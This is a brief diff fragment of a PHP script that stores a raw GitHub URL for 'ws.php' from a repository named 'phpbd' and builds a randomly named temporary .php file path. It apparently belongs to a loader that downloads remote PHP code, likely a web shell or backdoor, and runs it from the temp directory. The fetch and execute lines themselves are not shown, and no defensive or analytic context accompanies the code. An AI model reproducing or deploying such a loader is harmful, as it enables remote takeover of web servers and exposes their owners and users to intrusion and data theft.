@@ -2,7 +2,6 @@
 
 $url = 'https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/ws.php';
 
-
 $tempDir = sys_get_temp_dir();
 $tempFile = $tempDir . '/temp_script_' . uniqid() . '.php';
 
